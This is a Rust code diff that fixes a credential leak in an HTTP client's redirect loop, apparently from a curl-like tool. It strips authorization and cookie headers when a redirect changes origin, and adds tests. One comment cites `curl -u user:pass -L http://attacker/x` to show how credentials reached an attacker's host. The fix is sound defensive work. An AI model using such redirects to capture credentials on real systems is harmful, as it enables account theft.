@@ -140,6 +140,8 @@ pub async fn fetch(req: &Request) -> Result<Response, Error> {
     let mut url = req.url.clone();
     let mut body = req.body.clone();
     let mut redirects = 0u32;
+    // Headers travel with the chain so credentials can be DROPPED at an origin change (below).
+    let mut headers = req.headers.clone();
 
     // Resolve the timeout defaults ONCE, here, so BOTH targets get them. They used to be applied
     // inside the native `fetch_once` only — which left the wasm path (the durable Golem agent)
@@ -154,7 +156,7 @@ pub async fn fetch(req: &Request) -> Result<Response, Error> {
         let resp = fetch_once(
             &method,
             &url,
-            &req.headers,
+            &headers,
             body.clone(),
             connect_timeout,
             timeout,
@@ -170,6 +172,15 @@ pub async fn fetch(req: &Request) -> Result<Response, Error> {
                 redirects += 1;
                 let next = resolve_url(&url, location)
                     .ok_or_else(|| Error::BadRedirect(location.to_string()))?;
+                // Drop credentials when the redirect leaves the origin. Headers used to be re-sent
+                // verbatim on every hop, so `curl -u user:pass -L http://attacker/x` handed the
+                // Basic credential synthesized by wcurl straight to whatever host the 302 named.
+                // Real curl requires `--location-trusted` for exactly this, and reqwest's own
+                // `remove_sensitive_headers` never runs here because redirects are followed by this
+                // loop rather than by reqwest.
+                if !same_origin(&url, &next) {
+                    headers.retain(|(name, _)| !is_credential_header(name));
+                }
                 (method, body) = redirect_method(&method, resp.status, body);
                 url = next;
                 continue;
@@ -206,6 +217,55 @@ fn redirect_method(
         303 => (Method::GET, None),
         301 | 302 if *method == Method::POST => (Method::GET, None),
         _ => (method.clone(), body),
+    }
+}
+
+/// Whether a header carries a credential that must not follow a redirect off-origin — and, for
+/// callers that display request headers, must not be shown verbatim.
+///
+/// Matched case-insensitively (HTTP field names are case-insensitive). `Cookie` is included because
+/// a cookie is a bearer credential in practice, whatever its scoping rules say.
+///
+/// Public so `wcurl -v` masks exactly the same set the redirect logic drops; two lists that must
+/// agree are a list that eventually won't.
+#[must_use]
+pub fn is_credential_header(name: &str) -> bool {
+    const CREDENTIAL_HEADERS: &[&str] = &["authorization", "cookie", "proxy-authorization"];
+    CREDENTIAL_HEADERS
+        .iter()
+        .any(|c| name.eq_ignore_ascii_case(c))
+}
+
+/// The `scheme://host:port` origin of an absolute URL, lowercased. `None` if it will not parse.
+fn origin_of(url: &str) -> Option<(String, String, Option<u16>)> {
+    use iri_string::types::UriAbsoluteStr;
+    let uri = UriAbsoluteStr::new(url.split('#').next().unwrap_or(url)).ok()?;
+    let authority = uri.authority_components()?;
+    Some((
+        uri.scheme_str().to_ascii_lowercase(),
+        authority.host().to_ascii_lowercase(),
+        authority.port().and_then(|p| p.parse().ok()),
+    ))
+}
+
+/// Whether two URLs share a scheme, host and port.
+///
+/// An unparseable URL on either side answers `false` — the conservative direction, since the caller
+/// uses this to decide whether to KEEP credentials.
+fn same_origin(a: &str, b: &str) -> bool {
+    /// The port a scheme implies when the URL omits one.
+    fn effective_port(scheme: &str, port: Option<u16>) -> Option<u16> {
+        port.or(match scheme {
+            "http" => Some(80),
+            "https" => Some(443),
+            _ => None,
+        })
+    }
+    match (origin_of(a), origin_of(b)) {
+        (Some((sa, ha, pa)), Some((sb, hb, pb))) => {
+            sa == sb && ha == hb && effective_port(&sa, pa) == effective_port(&sb, pb)
+        }
+        _ => false,
     }
 }
 
@@ -577,6 +637,86 @@ mod transport_tests {
             }
         });
         base
+    }
+
+    /// A server that echoes the request head it received as the response body, so a test can assert
+    /// on which headers actually went out on a given hop.
+    fn header_echo_server(replies: Vec<(u16, Vec<(String, String)>)>) -> String {
+        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+        let base = format!("http://{}", listener.local_addr().unwrap());
+        let base_for_thread = base.clone();
+        std::thread::spawn(move || {
+            for (status, headers) in replies {
+                let Ok((mut stream, _)) = listener.accept() else {
+                    break;
+                };
+                let mut buf = [0u8; 4096];
+                let n = stream.read(&mut buf).unwrap_or(0);
+                let body = String::from_utf8_lossy(&buf[..n]).into_owned();
+                let mut head = format!("HTTP/1.1 {status} X\r\nContent-Length: {}\r\n", body.len());
+                for (k, v) in headers {
+                    let v = v.replace("${BASE}", &base_for_thread);
+                    let _ = write!(head, "{k}: {v}\r\n");
+                }
+                head.push_str("Connection: close\r\n\r\n");
+                let _ = stream.write_all(head.as_bytes());
+                let _ = stream.write_all(body.as_bytes());
+                let _ = stream.flush();
+            }
+        });
+        base
+    }
+
+    #[tokio::test]
+    async fn credentials_are_dropped_when_a_redirect_leaves_the_origin() {
+        // Two DIFFERENT servers: the first 302s to the second, which echoes what it received.
+        let victim = header_echo_server(vec![(200, vec![])]);
+        let attacker = scripted_server(vec![reply(
+            302,
+            &[("Location", &format!("{victim}/collect"))],
+            "go",
+        )]);
+
+        let mut req = Request::new(Method::GET, attacker);
+        req.follow_redirects = true;
+        req.headers = vec![
+            ("Authorization".into(), "Basic c2VjcmV0".into()),
+            ("Cookie".into(), "session=abc".into()),
+            ("X-Harmless".into(), "keep-me".into()),
+        ];
+        let resp = fetch(&req).await.unwrap();
+        let echoed = String::from_utf8_lossy(&resp.body).to_ascii_lowercase();
+
+        assert!(
+            !echoed.contains("c2VjcmV0".to_ascii_lowercase().as_str()),
+            "the Basic credential must not reach the redirect target:\n{echoed}"
+        );
+        assert!(
+            !echoed.contains("session=abc"),
+            "the cookie must not reach the redirect target:\n{echoed}"
+        );
+        assert!(
+            echoed.contains("keep-me"),
+            "non-credential headers still travel:\n{echoed}"
+        );
+    }
+
+    #[tokio::test]
+    async fn credentials_survive_a_same_origin_redirect() {
+        // Same server, so the same origin: this is the case curl -L is normally used for.
+        let base = header_echo_server(vec![
+            (302, vec![("Location".into(), "/next".into())]),
+            (200, vec![]),
+        ]);
+        let mut req = Request::new(Method::GET, base);
+        req.follow_redirects = true;
+        req.headers = vec![("Authorization".into(), "Basic c2VjcmV0".into())];
+        let resp = fetch(&req).await.unwrap();
+        let echoed = String::from_utf8_lossy(&resp.body);
+        assert!(
+            echoed.contains("c2VjcmV0"),
+            "a same-origin redirect must not strip credentials:\n{echoed}"
+        );
     }
 
     #[tokio::test]
